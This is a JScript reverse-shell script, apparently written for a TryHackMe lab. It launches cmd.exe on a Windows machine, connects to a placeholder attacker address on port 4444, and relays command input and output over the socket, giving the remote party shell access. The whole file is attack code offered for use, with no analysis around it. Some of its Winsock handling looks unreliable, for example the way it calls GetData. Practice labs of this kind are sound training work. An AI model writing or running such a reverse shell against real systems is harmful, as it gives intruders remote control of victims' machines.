// revshell.js — Windows JScript Reverse Shell for TryHackMe
// Connects to ATTACKER_IP:PORT and gives cmd.exe access.
// Usage: cscript //nologo revshell.js

var host = "YOUR_ATTACKER_IP";  // ← ← ← CHANGE THIS!
var port = 4444;                // ← ← ← CHANGE THIS!
var cmd = "cmd.exe";

try {
    // Create Winsock object (available on most Windows via MSScriptControl or pre-registered)
    var sock = new ActiveXObject("MSWinsock.Winsock");
} catch (e) {
    WScript.Echo("[!] MSWinsock.Winsock not available. Falling back to XMLHTTP (HTTP only) — unlikely to work for raw shell.");
    WScript.Quit(1);
}

try {
    // Create shell and process
    var shell = new ActiveXObject("WScript.Shell");
    var proc = shell.Exec(cmd);
    var stdin = proc.StdIn;
    var stdout = proc.StdOut;
    var stderr = proc.StdErr;

    // Connect to attacker
    sock.RemoteHost = host;
    sock.RemotePort = port;
    sock.Connect();

    // Wait for connection
    while (sock.State != 7) { // 7 = Connected
        WScript.Sleep(100);
        if (sock.State == 9) { // 9 = Closed/Failed
            WScript.Echo("[!] Connection failed.");
            WScript.Quit(1);
        }
    }

    WScript.Echo("[+] Connected to " + host + ":" + port);

    // Main loop: relay data between socket and process
    while (sock.State == 7) {
        // Send command output & errors to attacker
        while (!stdout.AtEndOfStream) {
            var out = stdout.ReadLine() + "\r\n";
            sock.SendData(out);
        }
        while (!stderr.AtEndOfStream) {
            var err = stderr.ReadLine() + "\r\n";
            sock.SendData(err);
        }

        // Read attacker input and send to cmd
        if (sock.BytesReceived > 0) {
            var data = sock.GetData();
            if (data) {
                stdin.WriteLine(data);
            }
        }

        WScript.Sleep(100);
    }

    proc.Terminate();
} catch (e) {
    WScript.Echo("[ERROR] " + e.message);
}
